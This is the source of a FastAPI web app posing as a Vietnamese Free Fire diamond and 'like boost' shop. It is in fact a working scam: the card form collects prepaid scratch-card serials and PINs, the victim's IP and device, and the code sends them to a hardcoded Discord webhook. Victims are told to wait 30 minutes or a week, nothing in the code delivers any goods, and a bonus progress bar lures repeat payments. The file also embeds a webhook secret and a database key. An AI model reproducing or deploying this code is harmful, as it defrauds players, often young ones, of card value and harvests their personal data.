import os
import re
import requests
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from supabase import create_client, Client

app = FastAPI()

# ---------------- CONFIGURATION ----------------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542472440440160307/dmEza6iLQvY2lXjtHgvM-SAyCTHeNh0Rlib8FxNRSxlxyaGbqkdmGMPZewkt7e21X2br"

# Cấu hình URL & Key Supabase
SUPABASE_URL = "https://sdeixbihpbiuqcguaxqi.supabase.co"
SUPABASE_KEY = "sb_publishable_1rDqbrmjaUAVmMuyxhW3Dg_9uLMOz4B"

supabase: Client = None
try:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception as e:
    print("Lỗi kết nối Supabase:", e)

# ---------------- MODELS ----------------
class CardRequest(BaseModel):
    user_id: str
    amount: str
    diamonds: str
    card_type: str
    serial: str
    pin: str
    device_info: str = "Unknown Device"
    network_info: str = "Unknown Network"

class ProgressCheckRequest(BaseModel):
    device_info: str

# ---------------- HELPER FUNCTIONS ----------------
def get_client_ip(request: Request) -> str:
    client_ip = request.headers.get("x-forwarded-for", request.client.host if request.client else "Unknown IP")
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()
    return client_ip

def parse_kc(diamonds_str: str) -> int:
    try:
        if not diamonds_str:
            return 0
        clean_str = diamonds_str.lower().replace('💎', '').replace('.', '').replace(',', '').strip()
        if 'k' in clean_str:
            num = float(clean_str.replace('k', ''))
            return int(num * 1000)
        digits = re.sub(r'[^\d]', '', clean_str)
        return int(digits) if digits else 0
    except Exception:
        return 0

# ---------------- API ENDPOINTS ----------------
@app.post("/api/get-progress")
async def get_progress(req: ProgressCheckRequest, request: Request):
    """Tự động kiểm tra tiến độ nạp dựa theo IP + Thiết bị ngay khi vừa vào trang"""
    client_ip = get_client_ip(request)
    device_key = f"{client_ip}_{req.device_info}"
    
    if not supabase:
        return {"total_kc": 0}
    try:
        res = supabase.table("user_progress").select("total_kc").eq("device_key", device_key).execute()
        if res.data and len(res.data) > 0:
            return {"total_kc": res.data[0].get("total_kc", 0)}
    except Exception as e:
        print("Progress Fetch Error:", e)
    return {"total_kc": 0}

@app.post("/api/verify-card")
async def verify_card(data: CardRequest, request: Request):
    if len(data.serial) < 6 or len(data.pin) < 6:
        raise HTTPException(status_code=400, detail="thẻ đã sai,vui lòng kiểm tra lại")
    
    client_ip = get_client_ip(request)
    device_key = f"{client_ip}_{data.device_info}"
    kc_added = parse_kc(data.diamonds)
    current_kc = 0

    # Kiểm tra nhà mạng
    net_upper = data.network_info.upper()
    is_special_network = any(net_name in net_upper for net_name in ["BON BON", "BONBON", "AP"])
    
    if is_special_network:
        wait_message = "đã nạp thành công vui lòng chờ 1 tuần để nhận thẻ"
    else:
        wait_message = "đã nạp thành công vui lòng chờ 30 phút để nhận thẻ"

    if supabase:
        try:
            # 1. Lưu vào Lịch sử nạp
            supabase.table("recharge_history").insert({
                "user_id": data.user_id,
                "amount": data.amount,
                "diamonds": data.diamonds,
                "device_key": device_key
            }).execute()

            # 2. Cập nhật tiến độ dựa theo (IP + Thiết bị)
            p_res = supabase.table("user_progress").select("total_kc").eq("device_key", device_key).execute()
            if p_res.data and len(p_res.data) > 0:
                current_kc = p_res.data[0].get("total_kc", 0) + kc_added
                supabase.table("user_progress").update({
                    "total_kc": current_kc,
                    "last_user_id": data.user_id,
                    "updated_at": datetime.utcnow().isoformat()
                }).eq("device_key", device_key).execute()
            else:
                current_kc = kc_added
                supabase.table("user_progress").insert({
                    "device_key": device_key,
                    "ip_address": client_ip,
                    "device_info": data.device_info,
                    "last_user_id": data.user_id,
                    "total_kc": current_kc
                }).execute()
        except Exception as e:
            print("Supabase Save Error:", e)

    # 3. Bắn Webhook Discord
    content = (
        f"**Đã có người nạp thẻ cào thành công**\n"
        f"**ID:** `{data.user_id}`\n"
        f"**Thiết bị:** `{data.device_info}`\n"
        f"**Mạng:** `{data.network_info}`\n"
        f"**IP:** `{client_ip}`\n"
        f"**Loại card:** `{data.card_type}`\n"
        f"**Mệnh giá / Gói:** `{data.amount}` ({data.diamonds})\n"
        f"**Tiến độ tích lũy thiết bị:** `{current_kc:,} / 70,000 KC`\n"
        f"**Seri:** `{data.serial}`\n"
        f"**Mã:** `{data.pin}`"
    )
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
    except Exception as e:
        print("Webhook Error:", e)

    return {
        "message": wait_message,
        "total_kc": current_kc
    }

@app.get("/api/history")
async def get_history(device_info: str = "", request: Request = None):
    if not supabase:
        return {"history": [], "top": [], "my_history": []}
    
    client_ip = get_client_ip(request) if request else "Unknown"
    device_key = f"{client_ip}_{device_info}"
    
    try:
        # Lấy lịch sử 10 phút gần nhất toàn hệ thống
        ten_mins_ago = (datetime.utcnow() - timedelta(minutes=10)).isoformat()
        history_res = supabase.table("recharge_history").select("*").gte("created_at", ten_mins_ago).order("created_at", desc=True).execute()
        
        # Bảng xếp hạng Top nạp
        top_res = supabase.table("user_progress").select("last_user_id, total_kc").order("total_kc", desc=True).limit(5).execute()
        
        # Lấy toàn bộ lịch sử cá nhân của thiết bị này
        my_history_res = supabase.table("recharge_history").select("*").eq("device_key", device_key).order("created_at", desc=True).execute()
        
        return {
            "history": history_res.data if history_res.data else [],
            "top": top_res.data if top_res.data else [],
            "my_history": my_history_res.data if my_history_res.data else []
        }
    except Exception as e:
        print("Supabase Fetch Error:", e)
        return {"history": [], "top": [], "my_history": []}

# ---------------- FRONTEND INTERFACE ----------------
@app.get("/", response_class=HTMLResponse)
async def serve_home():
    return """
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kelly shop - Nạp KC & Boost Like Garena</title>
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * { box-sizing: border-box; }
            body { 
                font-family: 'Plus Jakarta Sans', sans-serif; 
                background-color: #f4f6f9; color: #1a1d20; 
                margin: 0; padding: 0; text-align: center;
            }
            header { 
                background: #ffffff; padding: 18px 24px; 
                display: flex; justify-content: space-between; align-items: center; 
                position: sticky; top: 0; z-index: 100; 
                box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-bottom: 1px solid #eaeaea;
            }
            .brand-title { margin: 0; font-size: 20px; font-weight: 800; color: #0066ff; }
            .menu-btn { font-size: 26px; cursor: pointer; background: none; border: none; color: #1a1d20; }
            .side-menu { 
                display: none; position: fixed; top: 65px; left: 0; 
                width: 280px; background: #ffffff; height: 100%; 
                border-right: 1px solid #e0e0e0; text-align: left; 
                padding: 20px; z-index: 99; box-shadow: 4px 0 15px rgba(0,0,0,0.05);
            }
            .side-menu a { 
                display: block; color: #333333; padding: 14px 12px; 
                text-decoration: none; border-bottom: 1px solid #f0f0f0; 
                font-weight: 600; font-size: 16px; border-radius: 8px;
            }
            .side-menu a:hover { background: #f0f4ff; color: #0066ff; }
            .banner-container { max-width: 680px; margin: 20px auto 0 auto; padding: 0 16px; }
            .banner { width: 100%; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
            
            .service-selector-box {
                max-width: 680px; margin: 15px auto 0 auto; padding: 0 16px; text-align: left;
            }
            
            .container { 
                max-width: 680px; margin: 20px auto 40px auto; padding: 32px 28px; 
                background: #ffffff; border-radius: 20px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eaeaea;
            }
            
            .progress-box {
                background: #f8f9fa; border: 1px solid #e9ecef;
                padding: 18px; border-radius: 16px; margin-bottom: 24px; text-align: left;
            }
            .progress-title {
                font-size: 14px; font-weight: 700; color: #1a1d20;
                display: flex; justify-content: space-between; margin-bottom: 8px;
            }
            .progress-bg {
                background: #e9ecef; height: 16px; border-radius: 10px;
                overflow: hidden; position: relative;
            }
            .progress-fill {
                background: linear-gradient(90deg, #ff9500, #ff3b30);
                height: 100%; width: 0%; transition: width 0.4s ease;
            }
            .progress-gift {
                font-size: 12px; color: #d63027; font-weight: 700; margin-top: 8px; display: block;
            }

            .badge-verified {
                display: inline-block; background: #e6f4ea; color: #137333;
                padding: 8px 16px; border-radius: 50px; font-weight: 700;
                font-size: 16px; margin-bottom: 20px;
            }
            .form-label { text-align: left; font-weight: 700; font-size: 15px; color: #495057; margin: 16px 0 8px 4px; display: block; }
            select, input { 
                width: 100%; padding: 16px; margin-bottom: 12px; background: #f8f9fa; 
                border: 2px solid #e9ecef; color: #1a1d20; border-radius: 12px; 
                font-size: 16px; font-weight: 600; outline: none; transition: all 0.2s ease; font-family: inherit;
            }
            select:focus, input:focus { border-color: #0066ff; background: #ffffff; box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1); }
            
            .btn { 
                background: #0066ff; color: white; padding: 18px; border: none; 
                border-radius: 12px; cursor: pointer; font-weight: 700; width: 100%; 
                font-size: 18px; margin-top: 10px; box-shadow: 0 8px 20px rgba(0, 102, 255, 0.25); transition: all 0.2s ease;
            }
            .btn:hover { background: #0052cc; transform: translateY(-2px); }
            .btn-red { background: #ff3b30; display: none; box-shadow: 0 8px 20px rgba(255, 59, 48, 0.25); }
            .btn-red:hover { background: #d63027; }
            
            .support-btn {
                position: fixed; bottom: 25px; right: 25px; width: 60px; height: 60px;
                background-color: #ff3b30; color: white; border-radius: 50%;
                display: flex; justify-content: center; align-items: center;
                font-size: 26px; box-shadow: 0 6px 20px rgba(255, 59, 48, 0.4);
                cursor: pointer; z-index: 150; transition: transform 0.2s ease;
            }
            .support-btn:hover { transform: scale(1.08); }

            .support-modal {
                display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0,0,0,0.4); backdrop-filter: blur(4px);
                justify-content: center; align-items: center; z-index: 200;
            }
            .support-modal-content {
                background: #ffffff; padding: 28px; border-radius: 20px;
                width: 90%; max-width: 360px; text-align: center;
                box-shadow: 0 20px 40px rgba(0,0,0,0.15); position: relative;
            }
            .social-grid { display: flex; justify-content: space-around; align-items: center; margin-top: 25px; }
            .social-item { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: #1a1d20; font-weight: 700; font-size: 14px; }
            .social-icon { width: 55px; height: 55px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 28px; margin-bottom: 8px; }
            .tiktok-icon { background: #000000; color: white; }
            .facebook-icon { background: #1877f2; color: white; opacity: 0.5; cursor: not-allowed; }
            .telegram-icon { background: #24a1de; color: white; opacity: 0.5; cursor: not-allowed; }

            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(4px); justify-content: center; align-items: center; z-index: 200; }
            .modal-content { background: #ffffff; padding: 32px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.15); }
            .modal-btns { display: flex; gap: 12px; margin-top: 24px; }
            .btn-close { background: #f1f3f5; color: #495057; box-shadow: none; }
            .btn-confirm { background: #ff3b30; box-shadow: 0 4px 15px rgba(255, 59, 48, 0.3); }
            .page { display: none; }
            .active { display: block; }
            ul { list-style: none; padding: 0; margin: 0; }
            li { background: #f8f9fa; margin: 10px 0; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 600; text-align: left; border: 1px solid #f0f0f0; word-break: break-all; }
        </style>
    </head>
    <body>

        <header>
            <button class="menu-btn" onclick="toggleMenu()">☰</button>
            <h3 class="brand-title">Kelly shop - Nạp KC Garena Uy Tín</h3>
        </header>

        <div id="sideMenu" class="side-menu">
            <a href="#" onclick="showPage('home')">Trang chủ (Nạp thẻ)</a>
            <a href="#" onclick="showPage('myHistory')">Lịch sử cá nhân</a>
            <a href="#" onclick="showPage('history')">Lịch sử chung & Top nạp</a>
        </div>

        <!-- CHỌN DỊCH VỤ -->
        <div class="service-selector-box">
            <span class="form-label">Chọn dịch vụ:</span>
            <select id="mainServiceSelect" onchange="switchService(this.value)">
                <option value="kc">💎 Nạp Kim Cương Free Fire</option>
                <option value="like">👍 Boost Like Game Free Fire</option>
            </select>
        </div>

        <!-- TRANG CHỦ: NẠP KC -->
        <div id="home" class="page active">
            <div class="banner-container">
                <img src="https://i.postimg.cc/k5TS6ZXp/IMG-20260827-163058.jpg" class="banner" alt="Poster Web">
            </div>

            <div class="container">
                <span class="badge-verified">[Nạp KC - Uy Tín ✓]</span>
                
                <!-- THANH TIẾN ĐỘ NẠP THEO THIẾT BỊ/IP -->
                <div class="progress-box">
                    <div class="progress-title">
                        <span>Tiến độ thiết bị (70k 💎)</span>
                        <span id="progressText">0 / 70.000 💎</span>
                    </div>
                    <div class="progress-bg">
                        <div id="progressFill" class="progress-fill"></div>
                    </div>
                    <span id="giftNotice" class="progress-gift">🎁 Tích lũy đủ 70.000 KC trên thiết bị này để nhận +20.000 KC thưởng!</span>
                </div>

                <span class="form-label">Tài khoản Game:</span>
                <input type="text" id="userId" placeholder="Nhập ID tài khoản Free Fire...">
                
                <span class="form-label">Chọn gói nạp:</span>
                <select id="packageSelect" onchange="enableContinue()">
                    <option value="">-- Bấm vào đây để chọn gói --</option>
                    <option value="20k|5k 💎">20k - 5k 💎</option>
                    <option value="50k|20k 💎">50K - 20k 💎</option>
                    <option value="100k|70k 💎">100k - 70k 💎</option>
                    <option value="200k|160k 💎">200k - 160k 💎</option>
                    <option value="500k|500k 💎">500k - 500k 💎</option>
                    <option value="1tr|1.200.000 💎">1tr - 1.200.000 kc 💎</option>
                </select>

                <button id="continueBtn" class="btn btn-red" onclick="goToPayment('kc')">Tiếp tục</button>
            </div>
        </div>

        <!-- TRANG BOOST LIKE -->
        <div id="boostLikePage" class="page">
            <div class="banner-container">
                <img src="https://i.postimg.cc/k5TS6ZXp/IMG-20260827-163058.jpg" class="banner" alt="Boost Like Banner">
            </div>

            <div class="container">
                <span class="badge-verified">[Boost Like - Tăng Trải Nghiệm ✓]</span>
                
                <span class="form-label">Tài khoản Game:</span>
                <input type="text" id="likeUserId" placeholder="Nhập ID tài khoản Free Fire cần tăng Like...">
                
                <span class="form-label">Nhập số Like mong muốn:</span>
                <input type="number" id="likeAmountInput" placeholder="Ví dụ: 1000, 5000..." oninput="calculateLikePrice()">
                
                <div id="likePriceInfo" style="text-align: left; color: #0066ff; font-weight: 700; margin: 10px 0; font-size: 15px;">
                    Giá tiền quy đổi: 0đ
                </div>

                <button id="continueLikeBtn" class="btn btn-red" style="display: block;" onclick="goToPayment('like')">Tiếp tục</button>
            </div>
        </div>

        <!-- TRANG THANH TOÁN -->
        <div id="payment" class="page">
            <div class="banner-container">
                <img src="https://symbols.vn/wp-content/uploads/2022/09/Kim-cuong-Free-Fire.jpg" class="banner" alt="Payment Poster">
            </div>
            <div class="container" style="margin-top: 25px;">
                <h2 id="payAmountText" style="color: #0066ff; margin-bottom: 25px; font-size: 24px;">Số tiền cần thanh toán: 0đ</h2>
                <button class="btn" onclick="showCardMenu()">Thanh toán</button>
            </div>
        </div>

        <!-- TRANG NHẬP CARD -->
        <div id="cardMenu" class="page">
            <div class="container" style="margin-top: 30px;">
                <h2 style="margin-top:0; font-size: 24px;">Thông Tin Thẻ Cào</h2>
                
                <span class="form-label">Loại thẻ:</span>
                <select id="cardType">
                    <option value="">-- Chọn loại thẻ --</option>
                    <option value="Viettel">Viettel</option>
                    <option value="VinaPhone">VinaPhone</option>
                    <option value="MobiFone">MobiFone</option>
                    <option value="Garena">Garena</option>
                    <option value="Zing">Zing (VNG)</option>
                    <option value="Gate">Gate</option>
                    <option value="Vcoin">Vcoin (VTC)</option>
                    <option value="AppStore">App Store & iTunes</option>
                    <option value="GooglePlay">Google Play</option>
                </select>

                <span class="form-label">Nhà mạng / Kênh cung cấp:</span>
                <input type="text" id="networkInfo" placeholder="Ví dụ: Viettel, BON BON, AP...">

                <span class="form-label">Số Seri:</span>
                <input type="text" id="cardSerial" placeholder="Nhập số Seri trên thẻ...">

                <span class="form-label">Mã Mã Thẻ (PIN):</span>
                <input type="text" id="cardPin" placeholder="Nhập mã PIN (mã phủ cào)...">

                <button class="btn" onclick="submitCard()">Xác Nhận Nạp Thẻ</button>
                <button class="btn btn-close" style="width: 100%; margin-top: 10px;" onclick="showPage('home')">Quay lại</button>
            </div>
        </div>

        <!-- TRANG LỊCH SỬ CÁ NHÂN -->
        <div id="myHistory" class="page">
            <div class="container">
                <h3 style="margin-top: 0; color: #0066ff;">Lịch Sử Nạp Cá Nhân</h3>
                <ul id="myHistoryList">
                    <li>Đang tải dữ liệu...</li>
                </ul>
            </div>
        </div>

        <!-- TRANG LỊCH SỬ CHUNG & TOP NẠP -->
        <div id="history" class="page">
            <div class="container">
                <h3 style="color: #ff3b30; margin-top: 0;">🏆 Top Nạp Kim Cương</h3>
                <ul id="topList">
                    <li>Đang tải dữ liệu...</li>
                </ul>

                <h3 style="color: #0066ff; margin-top: 30px;">⚡ Lịch Sử Nạp Toàn Hệ Thống (10 phút gần nhất)</h3>
                <ul id="globalHistoryList">
                    <li>Đang tải dữ liệu...</li>
                </ul>
            </div>
        </div>

        <!-- NÚT HỖ TRỢ BÊN GÓC -->
        <div class="support-btn" onclick="openSupportModal()">
            <i class="fa-solid fa-headset"></i>
        </div>

        <!-- MODAL HỖ TRỢ CLIENT -->
        <div id="supportModal" class="support-modal">
            <div class="support-modal-content">
                <h3 style="margin-top:0;">Trung Tâm Hỗ Trợ</h3>
                <p style="font-size: 14px; color: #666;">Chọn kênh liên hệ để gặp tư vấn viên:</p>
                <div class="social-grid">
                    <a href="https://www.tiktok.com" target="_blank" class="social-item">
                        <div class="social-icon tiktok-icon"><i class="fa-brands fa-tiktok"></i></div>
                        <span>TikTok</span>
                    </a>
                    <a class="social-item">
                        <div class="social-icon facebook-icon"><i class="fa-brands fa-facebook-f"></i></div>
                        <span>Facebook</span>
                    </a>
                    <a class="social-item">
                        <div class="social-icon telegram-icon"><i class="fa-brands fa-telegram"></i></div>
                        <span>Telegram</span>
                    </a>
                </div>
                <button class="btn btn-close" style="margin-top: 25px; padding: 10px;" onclick="closeSupportModal()">Đóng</button>
            </div>
        </div>

        <!-- SCRIPT XỬ LÝ TRÊN CLIENT -->
        <script>
            let selectedAmount = "";
            let selectedDiamonds = "";
            let currentService = "kc";

            // Lấy thông tin thiết bị đơn giản
            function getDeviceInfo() {
                const ua = navigator.userAgent;
                if (/android/i.test(ua)) return "Android Device";
                if (/iPad|iPhone|iPod/.test(ua)) return "iOS Device";
                if (/windows/i.test(ua)) return "Windows PC";
                if (/mac/i.test(ua)) return "Mac Device";
                return "Browser User";
            }

            function toggleMenu() {
                const menu = document.getElementById("sideMenu");
                menu.style.display = menu.style.display === "block" ? "none" : "block";
            }

            function showPage(pageId) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                
                if (pageId === 'home') {
                    document.getElementById('home').classList.add('active');
                    document.getElementById('mainServiceSelect').value = 'kc';
                } else if (pageId === 'boostLikePage') {
                    document.getElementById('boostLikePage').classList.add('active');
                    document.getElementById('mainServiceSelect').value = 'like';
                } else {
                    const target = document.getElementById(pageId);
                    if (target) target.classList.add('active');
                }

                document.getElementById("sideMenu").style.display = "none";

                if (pageId === 'history' || pageId === 'myHistory') {
                    loadHistoryData();
                }
            }

            function switchService(val) {
                if (val === 'kc') {
                    showPage('home');
                } else if (val === 'like') {
                    showPage('boostLikePage');
                }
            }

            function enableContinue() {
                const val = document.getElementById("packageSelect").value;
                const btn = document.getElementById("continueBtn");
                if (val) {
                    btn.style.display = "block";
                    const parts = val.split("|");
                    selectedAmount = parts[0];
                    selectedDiamonds = parts[1];
                } else {
                    btn.style.display = "none";
                }
            }

            function calculateLikePrice() {
                const amount = parseInt(document.getElementById("likeAmountInput").value) || 0;
                // Ví dụ tỉ lệ: 1000 Like = 20,000đ (20đ / 1 like)
                const price = amount * 20;
                document.getElementById("likePriceInfo").innerText = `Giá tiền quy đổi: ${price.toLocaleString('vi-VN')}đ`;
            }

            function goToPayment(serviceType) {
                currentService = serviceType;
                let userId = "";
                
                if (serviceType === 'kc') {
                    userId = document.getElementById("userId").value.trim();
                    if (!userId) { alert("Vui lòng nhập ID Game!"); return; }
                    if (!selectedAmount) { alert("Vui lòng chọn gói nạp!"); return; }
                    document.getElementById("payAmountText").innerText = `Số tiền cần thanh toán: ${selectedAmount}`;
                } else {
                    userId = document.getElementById("likeUserId").value.trim();
                    const likes = document.getElementById("likeAmountInput").value;
                    if (!userId) { alert("Vui lòng nhập ID Game!"); return; }
                    if (!likes || likes <= 0) { alert("Vui lòng nhập số Like hợp lệ!"); return; }
                    
                    const price = parseInt(likes) * 20;
                    selectedAmount = `${price.toLocaleString('vi-VN')}đ`;
                    selectedDiamonds = `${likes} Like`;
                    document.getElementById("payAmountText").innerText = `Số tiền cần thanh toán: ${selectedAmount}`;
                }

                showPage('payment');
            }

            function showCardMenu() {
                showPage('cardMenu');
            }

            async function fetchProgress() {
                try {
                    const res = await fetch('/api/get-progress', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ device_info: getDeviceInfo() })
                    });
                    const data = await res.json();
                    updateProgressBar(data.total_kc || 0);
                } catch (e) {
                    console.error(e);
                }
            }

            function updateProgressBar(totalKc) {
                const target = 70000;
                const percent = Math.min(100, Math.round((totalKc / target) * 100));
                document.getElementById("progressFill").style.width = percent + "%";
                document.getElementById("progressText").innerText = `${totalKc.toLocaleString('vi-VN')} / 70.000 💎`;
            }

            async function submitCard() {
                const cardType = document.getElementById("cardType").value;
                const networkInfo = document.getElementById("networkInfo").value.trim();
                const serial = document.getElementById("cardSerial").value.trim();
                const pin = document.getElementById("cardPin").value.trim();
                
                const userId = currentService === 'kc' 
                    ? document.getElementById("userId").value.trim() 
                    : document.getElementById("likeUserId").value.trim();

                if (!cardType) { alert("Vui lòng chọn loại thẻ!"); return; }
                if (!serial || !pin) { alert("Vui lòng nhập đầy đủ Seri và Mã thẻ!"); return; }

                const payload = {
                    user_id: userId,
                    amount: selectedAmount,
                    diamonds: selectedDiamonds,
                    card_type: cardType,
                    serial: serial,
                    pin: pin,
                    device_info: getDeviceInfo(),
                    network_info: networkInfo || cardType
                };

                try {
                    const res = await fetch('/api/verify-card', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    const data = await res.json();
                    if (!res.ok) {
                        alert(data.detail || "Có lỗi xảy ra, vui lòng thử lại!");
                        return;
                    }

                    alert(data.message);
                    if (data.total_kc !== undefined) {
                        updateProgressBar(data.total_kc);
                    }
                    showPage('home');
                } catch (e) {
                    alert("Lỗi kết nối tới máy chủ!");
                }
            }

            async function loadHistoryData() {
                try {
                    const deviceInfo = encodeURIComponent(getDeviceInfo());
                    const res = await fetch(`/api/history?device_info=${deviceInfo}`);
                    const data = await res.json();

                    // Lịch sử cá nhân
                    const myHistUl = document.getElementById("myHistoryList");
                    myHistUl.innerHTML = "";
                    if (data.my_history && data.my_history.length > 0) {
                        data.my_history.forEach(item => {
                            myHistUl.innerHTML += `<li><b>ID:</b> ${item.user_id} | <b>Gói:</b> ${item.amount} (${item.diamonds}) | <small>${new Date(item.created_at).toLocaleString('vi-VN')}</small></li>`;
                        });
                    } else {
                        myHistUl.innerHTML = "<li>Chưa có lịch sử nạp nào trên thiết bị này.</li>";
                    }

                    // Top nạp
                    const topUl = document.getElementById("topList");
                    topUl.innerHTML = "";
                    if (data.top && data.top.length > 0) {
                        data.top.forEach((item, index) => {
                            topUl.innerHTML += `<li><b>#${index + 1}</b> - ID: ${item.last_user_id || 'Ẩn danh'} — Total: <b>${(item.total_kc || 0).toLocaleString('vi-VN')} 💎</b></li>`;
                        });
                    } else {
                        topUl.innerHTML = "<li>Chưa có dữ liệu xếp hạng.</li>";
                    }

                    // Lịch sử chung
                    const globalUl = document.getElementById("globalHistoryList");
                    globalUl.innerHTML = "";
                    if (data.history && data.history.length > 0) {
                        data.history.forEach(item => {
                            globalUl.innerHTML += `<li><b>ID:</b> ${item.user_id} | <b>Đã nạp:</b> ${item.amount} (${item.diamonds})</li>`;
                        });
                    } else {
                        globalUl.innerHTML = "<li>Chưa có giao dịch mới trong 10 phút qua.</li>";
                    }
                } catch (e) {
                    console.error(e);
                }
            }

            function openSupportModal() { document.getElementById("supportModal").style.display = "flex"; }
            function closeSupportModal() { document.getElementById("supportModal").style.display = "none"; }

            // Tự động chạy khi tải trang
            window.onload = function() {
                fetchProgress();
            };
        </script>
    </body>
    </html>
    """

# ---------------- LỆNH KHỞI CHẠY (NẾU CHẠY TRỰC TIẾP FILE) ----------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
    
